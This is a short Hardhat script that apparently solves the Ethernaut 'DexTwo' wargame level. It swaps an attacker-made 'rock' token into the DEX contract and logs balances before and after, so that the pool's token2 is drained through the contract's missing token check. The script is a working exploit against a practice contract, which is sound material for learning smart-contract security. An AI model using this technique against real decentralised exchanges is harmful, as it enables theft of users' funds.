import { ethers } from "hardhat";
import { attack } from "../typechain-types/contracts";

const CONTRACT_ADDRESS = "0xe73bc5BD4763A3307AB5F8F126634b7E12E3dA9b"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"
const ATTACK_ADDRESS = "0x99B3BB94e37CfF20a6aA3e8EC933FaB43710f1AD"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("DexTwo", CONTRACT_ADDRESS, signer)
  const attackContract = await ethers.getContractAt("DexTwoAttack", ATTACK_ADDRESS, signer)

  const token1 = await contract.token1()
  const token2 = await contract.token2()

  //console.log("amount of token2 for 1 token1: ", await contract.getSwapAmount(token1, token2, 1))
  //console.log("amount of token1 for 1 token2: ", await contract.getSwapAmount(token2, token1, 1))
  console.log("player token1 balance: ", await contract.balanceOf(token1, PLAYER_ADDRESS))
  console.log("player token2 balance: ", await contract.balanceOf(token2, PLAYER_ADDRESS))
  console.log("contract token1 balance: ", await contract.balanceOf(token1, CONTRACT_ADDRESS))
  console.log("contract token2 balance: ", await contract.balanceOf(token2, CONTRACT_ADDRESS))

  console.log("player rock balance: ", await contract.balanceOf(ATTACK_ADDRESS, PLAYER_ADDRESS))
  console.log("contract rock balance: ", await contract.balanceOf(ATTACK_ADDRESS, CONTRACT_ADDRESS))

  console.log("amount of token2 for 1 rock: ", await contract.getSwapAmount(ATTACK_ADDRESS, token2, 1))
  await attackContract.approve(CONTRACT_ADDRESS, 2)
  await contract.swap(ATTACK_ADDRESS, token2, 2)

  //console.log("amount of token2 for 1 token1: ", await contract.getSwapAmount(token1, token2, 1))
  //console.log("amount of token1 for 1 token2: ", await contract.getSwapAmount(token2, token1, 1))
  console.log("player token1 balance: ", await contract.balanceOf(token1, PLAYER_ADDRESS))
  console.log("player token2 balance: ", await contract.balanceOf(token2, PLAYER_ADDRESS))
  console.log("contract token1 balance: ", await contract.balanceOf(token1, CONTRACT_ADDRESS))
  console.log("contract token2 balance: ", await contract.balanceOf(token2, CONTRACT_ADDRESS))

  console.log("player rock balance: ", await contract.balanceOf(ATTACK_ADDRESS, PLAYER_ADDRESS))
  console.log("contract rock balance: ", await contract.balanceOf(ATTACK_ADDRESS, CONTRACT_ADDRESS))
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
